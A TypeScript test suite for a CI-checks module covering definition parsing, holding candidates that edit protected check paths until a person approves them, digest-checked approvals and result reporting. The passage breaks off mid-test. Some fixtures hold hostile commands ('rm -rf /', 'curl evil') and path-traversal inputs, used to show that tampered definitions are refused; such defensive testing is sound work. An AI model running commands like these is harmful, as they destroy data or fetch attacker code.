import type { CiContext, CiRunnerResult } from "@cloudflare/ci";
import type { RunnerOptions } from "@cloudflare/ci/worker";
import { introspectWorkflowInstance, runInDurableObject } from "cloudflare:test";
import { env } from "cloudflare:workers";
import { describe, expect, it, vi } from "vitest";
import { MAX_CHECK_DETAIL_LOG_BYTES } from "@railhead/shared/board-api";
import {
  AttemptTable,
  MAX_CHECK_LOG_BYTES,
  MAX_STORED_ATTEMPTS,
  REPORT_GRACE_MS,
} from "../src/checks/attempts";
import {
  CHECK_DEFINITION_PATH,
  MAX_CHECK_TIMEOUT_MS,
  MAX_DEFINITION_BYTES,
  MIN_CHECK_TIMEOUT_MS,
  editedPaths,
  parseTrustedCheck,
  sha256Hex,
  type TreeEntry,
} from "../src/checks/definition";
import { createChecks, type MainReader, type MainSource } from "../src/checks/port";
import {
  CHECK_RUNNER,
  REPORT_STEP,
  RUN_OVERHEAD_MS,
  parseCheckRunParams,
  runCheck,
  type CheckRunParams,
} from "../src/checks/workflow";
import { fail, ok, type PortResult } from "../src/contracts/result";
import type { GrantFor } from "../src/contracts/principals";
import { unavailableChecks } from "../src/contracts/unavailable";
import type { CheckAttempt, CheckPort, CheckReport } from "../src/contracts/train";
import { composeRepo, type RepoContext, type RepoPorts } from "../src/repo/composeRepo";
import { EventLog } from "../src/repo/eventLog";
import {
  insertBatch,
  markCheckStarted,
  recordCandidate,
  requestCheck,
} from "../src/modules/train/store";
import { CHECK_DEADLINE_MS, createTrain, HELD_PARK_TTL_MS } from "../src/modules/train/scheduler";
import { repoObjectName, type Repo } from "../src/repo/RepoObject";
import { MAX_SANDBOX_LIFETIME_MS, type Admission } from "../src/sandbox/admission";
import type { SandboxPolicy } from "../src/sandbox/policy";
import { queueing } from "./trainQueue";

const MAIN = "1".repeat(40);
const CANDIDATE = "2".repeat(40);
const OTHER = "3".repeat(40);
const ATTEMPT = `chk_${"a".repeat(32)}`;
const NOW = 1_800_000_000_000;
const HOST = `${"0".repeat(32)}.artifacts.cloudflare.net`;
const MAIN_REPO = "rh-m-main";
const SANDBOX = `sbx-${"f".repeat(32)}`;
const CLAIM = "clm_heldpin01";
const OWNER_ID = "usr_lemarier";
const COMMAND = "pnpm test";

const encoder = new TextEncoder();

/** The definition file's text with `fields` over a valid default. */
function definitionText(fields: Record<string, unknown> = {}): string {
  return JSON.stringify({
    name: "test",
    command: "pnpm test",
    timeoutMs: 600_000,
    protect: ["acceptance"],
    ...fields,
  });
}

describe("parseTrustedCheck", () => {
  it("reads every field, protects its own path first and digests the exact bytes", async () => {
    const text = definitionText({
      protect: ["acceptance", CHECK_DEFINITION_PATH, "acceptance"],
      acceptance: { decisionId: "dec_upload01", version: 2, option: "B" },
    });
    const bytes = encoder.encode(text);

    const check = await parseTrustedCheck(bytes, MAIN);

    expect(check).toEqual({
      definition: {
        name: "test",
        source: MAIN,
        digest: await sha256Hex(bytes),
        acceptance: { decision: { decisionId: "dec_upload01", version: 2 }, option: "B" },
      },
      command: "pnpm test",
      timeoutMs: 600_000,
      protectedPaths: [CHECK_DEFINITION_PATH, "acceptance"],
    });
    expect(check?.definition.digest).toMatch(/^[0-9a-f]{64}$/);
  });

  it("accepts a definition with no protected paths and no acceptance as an ordinary check", async () => {
    const check = await parseTrustedCheck(
      encoder.encode(JSON.stringify({ name: "lint", command: "make lint", timeoutMs: 60_000 })),
      MAIN,
    );

    expect(check?.definition.acceptance).toBeNull();
    expect(check?.protectedPaths).toEqual([CHECK_DEFINITION_PATH]);
  });

  it.each([
    ["the shortest timeout", MIN_CHECK_TIMEOUT_MS, true],
    ["the longest timeout", MAX_CHECK_TIMEOUT_MS, true],
    ["a timeout below the shortest", MIN_CHECK_TIMEOUT_MS - 1, false],
    ["a timeout above the longest", MAX_CHECK_TIMEOUT_MS + 1, false],
    ["a fractional timeout", 60_000.5, false],
  ])("takes %s only within bounds", async (_name, timeoutMs, accepted) => {
    const check = await parseTrustedCheck(encoder.encode(definitionText({ timeoutMs })), MAIN);

    expect(check !== null).toBe(accepted);
  });

  it.each([
    ["text that is not JSON", "{name:"],
    ["an array", "[]"],
    ["an unknown field", definitionText({ env: { TOKEN: "x" } })],
    ["an empty name", definitionText({ name: " " })],
    ["a name too long", definitionText({ name: "n".repeat(129) })],
    ["an empty command", definitionText({ command: "" })],
    ["a command with a NUL", definitionText({ command: "pnpm\0test" })],
    ["a parent path", definitionText({ protect: ["../main"] })],
    ["an absolute path", definitionText({ protect: ["/etc"] })],
    ["an empty segment", definitionText({ protect: ["a//b"] })],
    ["too many paths", definitionText({ protect: Array.from({ length: 33 }, (_, i) => `p${i}`) })],
    [
      "an acceptance without a decision id",
      definitionText({ acceptance: { decisionId: "upload", version: 1, option: "A" } }),
    ],
    [
      "an acceptance with version 0",
      definitionText({ acceptance: { decisionId: "dec_upload01", version: 0, option: "A" } }),
    ],
    [
      "an acceptance with an unknown field",
      definitionText({ acceptance: { decisionId: "dec_upload01", version: 1, option: "A", x: 1 } }),
    ],
  ])("refuses %s", async (_name, text) => {
    expect(await parseTrustedCheck(encoder.encode(text), MAIN)).toBeNull();
  });

  it("refuses a file one byte over the limit, invalid UTF-8 and a source that is not a commit", async () => {
    const padded = definitionText({ name: "x".repeat(10) }).padEnd(MAX_DEFINITION_BYTES + 1, " ");

    expect(await parseTrustedCheck(encoder.encode(padded), MAIN)).toBeNull();
    expect(await parseTrustedCheck(new Uint8Array([0xff, 0xfe]), MAIN)).toBeNull();
    expect(await parseTrustedCheck(encoder.encode(definitionText()), "main")).toBeNull();
  });
});

/** An in-memory Git object store: each commit is a map of file paths to contents. */
class FakeRepository implements MainReader {
  readonly #commits = new Map<string, Record<string, string>>();
  readonly #trees = new Map<string, TreeEntry[]>();
  /** Whether every read fails, as when Artifacts does not answer. */
  failing = false;
  reads = 0;

  commit(sha: string, files: Record<string, string>): void {
    this.#commits.set(sha, files);
  }

  async readFile(commit: string, path: string, maxBytes: number) {
    this.#read();
    const content = this.#commits.get(commit)?.[path];
    return content === undefined ? null : encoder.encode(content).slice(0, maxBytes + 1);
  }

  async rootTree(commit: string) {
    this.#read();
    const files = this.#commits.get(commit);
    return files === undefined ? null : this.#tree(files, "");
  }

  async readTree(hash: string) {
    this.#read();
    return this.#trees.get(hash) ?? null;
  }

  #read(): void {
    this.reads += 1;
    if (this.failing) throw new Error("Artifacts did not answer");
  }

  // Stores the tree of the files under `prefix` and returns its hash, derived from its entries.
  #tree(files: Record<string, string>, prefix: string): string {
    const names = new Set<string>();
    for (const path of Object.keys(files)) {
      if (path.startsWith(prefix)) names.add(path.slice(prefix.length).split("/")[0] ?? "");
    }
    const entries: TreeEntry[] = [...names].toSorted().map((name) => {
      const content = files[`${prefix}${name}`];
      return content === undefined
        ? { name, hash: this.#tree(files, `${prefix}${name}/`), type: "tree" }
        : { name, hash: `blob:${content}`, type: "blob" };
    });
    const hash = `tree:${JSON.stringify(entries)}`;
    this.#trees.set(hash, entries);
    return hash;
  }
}

describe("editedPaths", () => {
  const files = {
    [CHECK_DEFINITION_PATH]: definitionText(),
    "acceptance/a.test.ts": "expect(413)",
    "src/app.ts": "app",
  };

  async function edited(candidate: Record<string, string>): Promise<string[]> {
    const repository = new FakeRepository();
    repository.commit(MAIN, files);
    repository.commit(CANDIDATE, candidate);
    const [main, next] = await Promise.all([
      repository.rootTree(MAIN),
      repository.rootTree(CANDIDATE),
    ]);
    if (main === null || next === null) throw new Error("missing commit");
    return editedPaths(repository, main, next, [CHECK_DEFINITION_PATH, "acceptance"]);
  }

  it("finds nothing when only unprotected files change", async () => {
    expect(await edited({ ...files, "src/app.ts": "changed" })).toEqual([]);
  });

  it("finds the definition and a protected directory whose content changed", async () => {
    expect(
      await edited({
        ...files,
        [CHECK_DEFINITION_PATH]: definitionText({ command: "true" }),
        "acceptance/a.test.ts": "expect(201)",
      }),
    ).toEqual([CHECK_DEFINITION_PATH, "acceptance"]);
  });

  it("finds a protected file added under, or removed from, a protected directory", async () => {
    expect(await edited({ ...files, "acceptance/b.test.ts": "new" })).toEqual(["acceptance"]);
    const { "acceptance/a.test.ts": _removed, ...rest } = files;
    expect(await edited(rest)).toEqual(["acceptance"]);
  });

  it("throws when a tree the commit names cannot be read", async () => {
    const repository = new FakeRepository();
    await expect(editedPaths(repository, "tree:missing", "tree:missing", ["a"])).rejects.toThrow(
      "missing",
    );
  });
});

/** The sandbox and train as the checks module sees them, recording what it asked. */
class World {
  admissions: { attemptId: string; policy: SandboxPolicy; lifetimeMs: number }[] = [];
  releases: string[] = [];
  reports: CheckReport[] = [];
  created: { id: string; params: CheckRunParams }[] = [];
  admission: (lifetimeMs: number) => PortResult<Admission> = (lifetimeMs) =>
    ok({
      kind: "admitted",
      slot: {
        attemptId: ATTEMPT,
        sandbox: SANDBOX,
        state: "running",
        reason: null,
        policy: { host: HOST, namespace: "railhead", read: [MAIN_REPO], write: null },
        lifetimeMs,
        requestedAt: NOW,
        deadline: NOW + lifetimeMs,
      },
    });
  recorded: PortResult<CheckAttempt> | null = null;
  createFails = false;
  /** Attempts returned to the train, and whether the train still holds the next one. */
  released: string[] = [];
  trainHolds = true;
  /** Held attempts the train may still run, which the attempt table keeps. */
  heldByTrain = new Set<string>();
  resumes = 0;
}

interface Harness {
  checks: CheckPort;
  repository: FakeRepository;
  world: World;
  attempts: AttemptTable;
  /** The repository's event log. */
  log: EventLog;
  /** The object's SQL storage. */
  sql: SqlStorage;
  /** Whether the Worker is configured for checks; when not, `main` is `null`. */
  configure: (configured: boolean) => void;
}

/** Runs `body` with a checks port over a fresh object's storage and fakes for its neighbours. */
function withChecks(body: (harness: Harness) => Promise<void>): Promise<void> {
  const stub = env.REPO.getByName(crypto.randomUUID());
  return runInDurableObject(stub, async (_instance, state) => {
    const repoId = `rep_${"9".repeat(64)}`;
    const log = EventLog.open(state.storage, repoId);
    const context: RepoContext = {
      repoId,
      storage: state.storage,
      log,
      clock: () => NOW,
      env,
      wake: async () => true,
    };
    const world = new World();
    const repository = new FakeRepository();
    repository.commit(MAIN, {
      [CHECK_DEFINITION_PATH]: definitionText(),
      "acceptance/a.test.ts": "expect(413)",
    });
    repository.commit(CANDIDATE, {
      [CHECK_DEFINITION_PATH]: definitionText(),
      "acceptance/a.test.ts": "expect(413)",
      "src/app.ts": "candidate",
    });
    const composed = composeRepo(context);
    const ports = (): RepoPorts => ({
      ...composed,
      sandbox: {
        ...composed.sandbox,
        admit: async (attemptId, policy, lifetimeMs) => {
          world.admissions.push({ attemptId, policy, lifetimeMs });
          return world.admission(lifetimeMs);
        },
        release: async (attemptId) => {
          world.releases.push(attemptId);
          return ok(null);
        },
      },
      train: {
        ...composed.train,
        recordCheck: async (report) => {
          world.reports.push(report);
          return world.recorded ?? ok(await attempt());
        },
        release: (_tx, attemptId) => {
          if (world.trainHolds) world.released.push(attemptId);
          return world.trainHolds;
        },
        holds: (attemptId) => world.heldByTrain.has(attemptId),
        resume: async () => {
          world.resumes += 1;
        },
      },
    });
    let configured = true;
    const source: MainSource = {
      name: MAIN_REPO,
      namespace: "railhead",
      host: HOST,
      reader: repository,
    };
    const attempts = new AttemptTable(state.storage, (attemptId) => ports().train.holds(attemptId));
    const checks = createChecks({
      repoId,
      attempts,
      log,
      main: async () => (configured ? source : null),
      runs: {
        create: async (id, params) => {
          if (world.createFails) throw new Error("Workflows did not answer");
          world.created.push({ id, params });
        },
      },
      clock: () => NOW,
      ports,
    });
    await body({
      checks,
      repository,
      world,
      attempts,
      log,
      sql: state.storage.sql,
      configure: (value) => {
        configured = value;
      },
    });
  });
}

/** The train's attempt on the candidate, under main's definition. */
async function attempt(fields: Partial<CheckAttempt> = {}): Promise<CheckAttempt> {
  const check = await parseTrustedCheck(encoder.encode(definitionText()), MAIN);
  if (check === null) throw new Error("the fixture definition is not valid");
  return {
    attemptId: ATTEMPT,
    expectedMain: MAIN,
    candidate: CANDIDATE,
    pins: [{ claimId: CLAIM, generation: 1, commit: OTHER, episode: 1 }],
    definition: check.definition,
    decisions: [],
    createdAt: NOW,
    ...fields,
  };
}

describe("checks.definitions", () => {
  it("returns main's one definition, read from main", async () => {
    await withChecks(async ({ checks }) => {
      expect(await checks.definitions(MAIN)).toEqual(ok([(await attempt()).definition]));
    });
  });

  it("returns none when main has no definition, and refuses an invalid one", async () => {
    await withChecks(async ({ checks, repository }) => {
      repository.commit(OTHER, {});
      expect(await checks.definitions(OTHER)).toEqual(ok([]));

      repository.commit(OTHER, { [CHECK_DEFINITION_PATH]: "{}" });
      expect(await checks.definitions(OTHER)).toEqual(
        fail("invalid_request", "The check definition on main is not valid."),
      );
      expect((await checks.definitions("main")).ok).toBe(false);
    });
  });

  it("refuses as unavailable when Artifacts fails or the Worker is not configured", async () => {
    await withChecks(async ({ checks, repository, configure }) => {
      repository.failing = true;
      expect(await checks.definitions(MAIN)).toEqual(
        fail("unavailable", "The check definition could not be read."),
      );
      configure(false);
      expect((await checks.definitions(MAIN)).ok).toBe(false);
    });
  });
});

describe("checks.start", () => {
  it("admits a read-only sandbox for main's repository, records the attempt and starts one run", async () => {
    await withChecks(async ({ checks, world, attempts }) => {
      const lifetimeMs = 600_000 + RUN_OVERHEAD_MS;

      expect(await checks.start(await attempt())).toEqual(ok({ attemptId: ATTEMPT }));

      expect(world.admissions).toEqual([
        {
          attemptId: ATTEMPT,
          policy: { host: HOST, namespace: "railhead", read: [MAIN_REPO], write: null },
          lifetimeMs,
        },
      ]);
      expect(world.created).toEqual([
        {
          id: ATTEMPT,
          params: {
            repoId: `rep_${"9".repeat(64)}`,
            attemptId: ATTEMPT,
            candidate: CANDIDATE,
            digest: (await attempt()).definition.digest,
            command: "pnpm test",
            timeoutMs: 600_000,
            namespace: "railhead",
            artifactsRepo: MAIN_REPO,
            slot: { sandbox: SANDBOX, deadline: NOW + lifetimeMs },
          },
        },
      ]);
      expect(attempts.get(ATTEMPT)?.state).toEqual({
        kind: "started",
        sandbox: SANDBOX,
        deadline: NOW + lifetimeMs,
      });
      expect(parseCheckRunParams(world.created[0]?.params)).toEqual(world.created[0]?.params);
    });
  });

  it("fits the longest command, with its overhead, in the longest sandbox lifetime", async () => {
    await withChecks(async ({ checks, world, repository }) => {
      const text = definitionText({ timeoutMs: MAX_CHECK_TIMEOUT_MS });
      repository.commit(MAIN, { [CHECK_DEFINITION_PATH]: text });
      repository.commit(CANDIDATE, { [CHECK_DEFINITION_PATH]: text, "src/app.ts": "x" });
      const check = await parseTrustedCheck(encoder.encode(text), MAIN);
      if (check === null) throw new Error("invalid fixture");

      expect((await checks.start(await attempt({ definition: check.definition }))).ok).toBe(true);
      expect(world.admissions[0]?.lifetimeMs).toBe(MAX_CHECK_TIMEOUT_MS + RUN_OVERHEAD_MS);
      expect(MAX_CHECK_TIMEOUT_MS + RUN_OVERHEAD_MS).toBeLessThanOrEqual(MAX_SANDBOX_LIFETIME_MS);
    });
  });

  it("starts nothing new for a repeat of a started attempt", async () => {
    await withChecks(async ({ checks, world }) => {
      await checks.start(await attempt());
      const reads = world.admissions.length;

      expect(await checks.start(await attempt())).toEqual(ok({ attemptId: ATTEMPT }));
      expect(world.admissions).toHaveLength(reads);
      // The repeat asks again for the same instance, which Workflows does not create twice.
      expect(world.created.map((run) => run.id)).toEqual([ATTEMPT, ATTEMPT]);
    });
  });

  it("asks for the run again after a create that failed, in the slot it already holds", async () => {
    await withChecks(async ({ checks, world, attempts }) => {
      world.createFails = true;
      expect(await checks.start(await attempt())).toEqual(
        fail("unavailable", "The check run could not be started; ask again."),
      );
      expect(attempts.get(ATTEMPT)?.state.kind).toBe("started");

      world.createFails = false;
      expect(await checks.start(await attempt())).toEqual(ok({ attemptId: ATTEMPT }));
      expect(world.admissions).toHaveLength(1);
      expect(world.created).toHaveLength(1);
    });
  });

  it("stops before anything runs when the candidate commit is missing", async () => {
    await withChecks(async ({ checks, world, attempts }) => {
      const result = await checks.start(await attempt({ candidate: OTHER }));

      expect(result).toEqual(
        fail("commit_not_found", "The candidate commit is missing; nothing ran."),
      );
      expect(world.admissions).toEqual([]);
      expect(world.created).toEqual([]);
      expect(attempts.get(ATTEMPT)).toBeNull();
    });
  });

  it("holds a candidate that edits its check definition, and never runs it", async () => {
    await withChecks(async ({ checks, world, repository, attempts }) => {
      repository.commit(CANDIDATE, {
        [CHECK_DEFINITION_PATH]: definitionText({ command: "true" }),
        "acceptance/a.test.ts": "expect(413)",
      });
      const held = fail(
        "check_held",
        "The candidate edits protected check paths; a person must approve it.",
      );

      expect(await checks.start(await attempt())).toEqual(held);
      expect(attempts.get(ATTEMPT)?.state).toEqual({
        kind: "held",
        paths: [CHECK_DEFINITION_PATH],
        digest: await digestOf(definitionText({ command: "true" })),
      });
      // A repeat stays held without reading the candidate again.
      expect(await checks.start(await attempt())).toEqual(held);
      expect(world.admissions).toEqual([]);
      expect(world.created).toEqual([]);
    });
  });

  it("holds a candidate that edits a path the definition protects", async () => {
    await withChecks(async ({ checks, repository, attempts, world }) => {
      repository.commit(CANDIDATE, {
        [CHECK_DEFINITION_PATH]: definitionText(),
        "acceptance/a.test.ts": "expect(201)",
      });

      expect((await checks.start(await attempt())).ok).toBe(false);
      expect(attempts.get(ATTEMPT)?.state).toEqual({
        kind: "held",
        paths: ["acceptance"],
        digest: await digestOf(definitionText()),
      });
      expect(world.created).toEqual([]);
    });
  });

  it("refuses an attempt whose definition is no longer main's, starting nothing", async () => {
    await withChecks(async ({ checks, world }) => {
      const stale = await attempt();
      stale.definition = { ...stale.definition, digest: "e".repeat(64) };

      expect(await checks.start(stale)).toEqual(
        fail("check_mismatch", "Main no longer holds the attempt's check definition."),
      );
      expect(world.admissions).toEqual([]);
    });
  });

  it("refuses a repeat of an attempt on another candidate", async () => {
    await withChecks(async ({ checks, repository, world }) => {
      await checks.start(await attempt());
      repository.commit(OTHER, { [CHECK_DEFINITION_PATH]: definitionText() });

      expect(await checks.start(await attempt({ candidate: OTHER }))).toEqual(
        fail("check_mismatch", "This attempt was recorded for another candidate."),
      );
      expect(world.created).toHaveLength(1);
    });
  });

  it("waits with busy, recording nothing, while every sandbox slot is taken", async () => {
    await withChecks(async ({ checks, world, attempts }) => {
      world.admission = () => ok({ kind: "queued", position: 2 });

      expect(await checks.start(await attempt())).toEqual(
        fail("busy", "Every check sandbox is taken; the attempt waits for a slot."),
      );
      expect(attempts.get(ATTEMPT)).toBeNull();
      expect(world.created).toEqual([]);
    });
  });

  it("refuses invalid attempts and an unconfigured Worker before reading anything", async () => {
    await withChecks(async ({ checks, repository, configure }) => {
      const base = await attempt();
      expect((await checks.start({ ...base, candidate: "abc" })).ok).toBe(false);
      expect((await checks.start({ ...base, attemptId: `chk_${"a".repeat(64)}` })).ok).toBe(false);
      expect(
        (await checks.start({ ...base, definition: { ...base.definition, source: OTHER } })).ok,
      ).toBe(false);
      expect(repository.reads).toBe(0);

      configure(false);
      expect(await checks.start(base)).toEqual(
        fail("unavailable", "Checks have no Artifacts repository."),
      );
    });
  });
});

/** SHA-256 of a definition's text, as the checks module digests its bytes. */
function digestOf(text: string): Promise<string> {
  return sha256Hex(encoder.encode(text));
}

/** The owner's grant approving `fields`, over the fixture attempt and candidate by default. */
function approval(
  digest: string,
  fields: Partial<GrantFor<"check.approve">> = {},
): GrantFor<"check.approve"> {
  return {
    kind: "human",
    userId: OWNER_ID,
    repoId: `rep_${"9".repeat(64)}`,
    grantId: "pkc_first",
    action: { kind: "check.approve", checkRunId: ATTEMPT, candidate: CANDIDATE, digest },
    ...fields,
  };
}

/** The types and data of every event in `log`. */
function loggedEvents(log: EventLog): { type: string; actor: string; data: unknown }[] {
  return log.replay(0, 100).events.map((event) => ({
    type: event.type,
    actor: event.actor.id,
    data: event.data,
  }));
}

/** Holds the fixture attempt on a candidate that rewrites its command; returns that digest. */
async function heldOnRewrite(harness: Harness): Promise<string> {
  const text = definitionText({ command: "true" });
  harness.repository.commit(CANDIDATE, {
    [CHECK_DEFINITION_PATH]: text,
    "acceptance/a.test.ts": "expect(413)",
  });
  await harness.checks.start(await attempt());
  return digestOf(text);
}

describe("checks.approve", () => {
  it("records the approval with its event, returns the attempt and runs the candidate's definition", async () => {
    await withChecks(async (harness) => {
      const { checks, world, attempts, log } = harness;
      const digest = await heldOnRewrite(harness);

      expect(await checks.approve(approval(digest))).toEqual(ok({ checkRunId: ATTEMPT }));
      expect(attempts.get(ATTEMPT)?.approval).toEqual({
        userId: OWNER_ID,
        grantId: "pkc_first",
        digest,
        approvedAt: NOW,
      });
      expect(world.released).toEqual([ATTEMPT]);
      expect(world.resumes).toBe(1);
      expect(loggedEvents(log)).toEqual([
        {
          type: "train.held",
          actor: "sys_checks",
          data: {
            checkRunId: ATTEMPT,
            expectedMain: MAIN,
            candidate: CANDIDATE,
            claims: [CLAIM],
            paths: [CHECK_DEFINITION_PATH],
            digest,
          },
        },
        {
          type: "check.approved",
          actor: OWNER_ID,
          data: { checkRunId: ATTEMPT, candidate: CANDIDATE, digest },
        },
      ]);

      // The train asks again: the approved attempt runs the candidate's command, under the
      // attempt's own identity, so its report still matches.
      const mainDigest = (await attempt()).definition.digest;
      expect(await checks.start(await attempt())).toEqual(ok({ attemptId: ATTEMPT }));
      expect(world.created.map(({ params }) => [params.command, params.digest])).toEqual([
        ["true", mainDigest],
      ]);
      expect(attempts.get(ATTEMPT)?.state).toEqual({
        kind: "started",
        sandbox: SANDBOX,
        deadline: NOW + Math.min(MAX_SANDBOX_LIFETIME_MS, 600_000 + RUN_OVERHEAD_MS),
      });
      const reported = await checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest: mainDigest,
        result: "pass",
        log: "ok",
        finishedAt: NOW,
      });
      expect(reported.ok).toBe(true);
      expect(attempts.get(ATTEMPT)?.approval?.digest).toBe(digest);
    });
  });

  it("answers a repeat of the recorded grant as the first, and refuses any other grant", async () => {
    await withChecks(async (harness) => {
      const digest = await heldOnRewrite(harness);
      await harness.checks.approve(approval(digest));

      expect(await harness.checks.approve(approval(digest))).toEqual(ok({ checkRunId: ATTEMPT }));
      const other = await harness.checks.approve(approval(digest, { grantId: "pkc_second" }));
      expect(other.ok ? null : other.code).toBe("action_stale");
      expect(harness.world.released).toEqual([ATTEMPT]);
      expect(loggedEvents(harness.log).map((event) => event.type)).toEqual([
        "train.held",
        "check.approved",
      ]);
    });
  });

  it("answers a repeat of the recorded grant after the attempt started and after it reported", async () => {
    await withChecks(async (harness) => {
      const { checks, attempts, world, log } = harness;
      const digest = await heldOnRewrite(harness);
      await checks.approve(approval(digest));
      const mainDigest = (await attempt()).definition.digest;
      expect(await checks.start(await attempt())).toEqual(ok({ attemptId: ATTEMPT }));
      expect(attempts.get(ATTEMPT)?.state.kind).toBe("started");

      expect(await checks.approve(approval(digest))).toEqual(ok({ checkRunId: ATTEMPT }));
      const otherWhileStarted = await checks.approve(approval(digest, { grantId: "pkc_second" }));
      expect(otherWhileStarted.ok ? null : otherWhileStarted.code).toBe("action_stale");

      const reported = await checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest: mainDigest,
        result: "pass",
        log: "ok",
        finishedAt: NOW,
      });
      expect(reported.ok).toBe(true);
      expect(attempts.get(ATTEMPT)?.state.kind).toBe("reported");

      expect(await checks.approve(approval(digest))).toEqual(ok({ checkRunId: ATTEMPT }));
      const otherWhileReported = await checks.approve(approval(digest, { grantId: "pkc_second" }));
      expect(otherWhileReported.ok ? null : otherWhileReported.code).toBe("action_stale");
      // A repeat records nothing more and returns nothing to the train again.
      expect(attempts.get(ATTEMPT)?.approval?.grantId).toBe("pkc_first");
      expect(world.released).toEqual([ATTEMPT]);
      expect(loggedEvents(log).map((event) => event.type)).toEqual([
        "train.held",
        "check.approved",
      ]);
    });
  });

  it("refuses a digest that is not the held definition's, approving nothing", async () => {
    await withChecks(async (harness) => {
      await heldOnRewrite(harness);
      const stale = await harness.checks.approve(approval(await digestOf(definitionText())));

      expect(stale.ok ? null : stale.code).toBe("action_stale");
      expect(harness.attempts.get(ATTEMPT)?.approval).toBeNull();
      expect(harness.world.released).toEqual([]);
      expect(loggedEvents(harness.log).map((event) => event.type)).toEqual(["train.held"]);
    });
  });

  it("refuses when the candidate's definition read at the time of use is not the one named", async () => {
    await withChecks(async (harness) => {
      const digest = await heldOnRewrite(harness);
      harness.repository.commit(CANDIDATE, {
        [CHECK_DEFINITION_PATH]: definitionText({ command: "rm -rf /" }),
        "acceptance/a.test.ts": "expect(413)",
      });

      const stale = await harness.checks.approve(approval(digest));
      expect(stale.ok ? null : stale.code).toBe("action_stale");
      expect(harness.attempts.get(ATTEMPT)?.approval).toBeNull();
      expect(harness.world.released).toEqual([]);
    });
  });

  it("refuses when the train no longer holds the attempt, recording nothing", async () => {
    await withChecks(async (harness) => {
      const digest = await heldOnRewrite(harness);
      harness.world.trainHolds = false;

      const stale = await harness.checks.approve(approval(digest));
      expect(stale.ok ? null : stale.code).toBe("action_stale");
      expect(harness.attempts.get(ATTEMPT)?.approval).toBeNull();
      expect(harness.world.resumes).toBe(0);
      expect(loggedEvents(harness.log).map((event) => event.type)).toEqual(["train.held"]);
      // Still held: the next start refuses without running.
      expect((await harness.checks.start(await attempt())).ok).toBe(false);
      expect(harness.world.created).toEqual([]);
    });
  });

  it("refuses an attempt that is not held, and a candidate with no valid definition", async () => {
    await withChecks(async (harness) => {
      // Not held: an ordinary candidate starts at once.
      await harness.checks.start(await attempt());
      const running = await harness.checks.approve(approval(await digestOf(definitionText())));
      expect(running.ok ? null : running.code).toBe("action_stale");
    });
    await withChecks(async (harness) => {
      // The candidate deletes its definition: held with nothing to approve.
      harness.repository.commit(CANDIDATE, { "acceptance/a.test.ts": "expect(413)" });
      await harness.checks.start(await attempt());
      expect(harness.attempts.get(ATTEMPT)?.state).toEqual({
        kind: "held",
        paths: [CHECK_DEFINITION_PATH],
        digest: null,
      });
      const none = await harness.checks.approve(approval(await digestOf(definitionText())));
      expect(none.ok ? null : none.code).toBe("action_stale");
      expect(harness.world.released).toEqual([]);
    });
  });

  it("refuses a grant for another repository, action or malformed digest before reading", async () => {
    await withChecks(async (harness) => {
      const digest = await heldOnRewrite(harness);
      const reads = harness.repository.reads;
      const action = approval(digest).action;
      for (const grant of [
        approval(digest, { repoId: `rep_${"8".repeat(64)}` }),
        approval(digest, { grantId: "" }),
        approval(digest, { action: { ...action, digest: digest.toUpperCase() } }),
        approval(digest, { action: { ...action, candidate: "main" } }),
        approval(digest, { action: { ...action, checkRunId: "int_merge01" } }),
      ]) {
        const refused = await harness.checks.approve(grant);
        expect(refused.ok ? null : refused.code).toBe("invalid_request");
      }
      expect(harness.repository.reads).toBe(reads);
      expect(harness.attempts.get(ATTEMPT)?.approval).toBeNull();
    });
  });

  it("refuses as unavailable when the definition cannot be read, approving nothing", async () => {
    await withChecks(async (harness) => {
      const digest = await heldOnRewrite(harness);
      harness.repository.failing = true;

      const refused = await harness.checks.approve(approval(digest));
      expect(refused.ok ? null : refused.code).toBe("unavailable");
      harness.configure(false);
      harness.repository.failing = false;
      const unconfigured = await harness.checks.approve(approval(digest));
      expect(unconfigured.ok ? null : unconfigured.code).toBe("unavailable");
      expect(harness.attempts.get(ATTEMPT)?.approval).toBeNull();
      expect(harness.world.released).toEqual([]);
    });
  });

  it("runs nothing when the approved definition no longer reads back with its digest", async () => {
    await withChecks(async (harness) => {
      const digest = await heldOnRewrite(harness);
      await harness.checks.approve(approval(digest));
      harness.repository.commit(CANDIDATE, {
        [CHECK_DEFINITION_PATH]: definitionText({ command: "curl evil" }),
        "acceptance/a.test.ts": "expect(413)",
      });

      const refused = await harness.checks.start(await attempt());
      expect(refused.ok ? null : refused.code).toBe("check_mismatch");
      expect(harness.world.admissions).toEqual([]);
      expect(harness.world.created).toEqual([]);
      expect(harness.attempts.get(ATTEMPT)?.state.kind).toBe("held");
    });
  });
});

/** Starts the fixture attempt and returns its definition's digest. */
async function started(harness: Harness): Promise<string> {
  await harness.checks.start(await attempt());
  return (await attempt()).definition.digest;
}

describe("checks.report", () => {
  it("records the result outside the sandbox, passes it to the train and frees the slot", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const log = "=== stdout ===\n12 passed";

      const result = await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "pass",
        log,
        finishedAt: NOW + 5,
      });

      expect(result).toEqual(ok(await attempt()));
      expect(harness.world.reports).toEqual([
        {
          attemptId: ATTEMPT,
          candidate: CANDIDATE,
          result: "pass",
          logDigest: await sha256Hex(encoder.encode(log)),
          finishedAt: NOW + 5,
        },
      ]);
      expect(harness.world.releases).toEqual([ATTEMPT]);
      expect(harness.attempts.get(ATTEMPT)?.state).toEqual({
        kind: "reported",
        result: "pass",
        log,
        logDigest: await sha256Hex(encoder.encode(log)),
        finishedAt: NOW + 5,
      });
    });
  });

  it("keeps only the end of a long log, digesting what it kept", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const log = `${"x".repeat(MAX_CHECK_LOG_BYTES)}tail`;

      await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "fail",
        log,
        finishedAt: NOW,
      });

      const state = harness.attempts.get(ATTEMPT)?.state;
      if (state?.kind !== "reported") throw new Error("not reported");
      expect(encoder.encode(state.log).byteLength).toBe(MAX_CHECK_LOG_BYTES);
      expect(state.log.endsWith("tail")).toBe(true);
      expect(harness.world.reports[0]?.logDigest).toBe(await sha256Hex(encoder.encode(state.log)));
    });
  });

  it.each([
    ["a two-byte", "é"],
    ["a four-byte", "😀"],
  ])("leaves out %s character split at the cut, staying within the cap", async (_name, char) => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      // The cut falls one byte into the character, which a decoder would turn into U+FFFD.
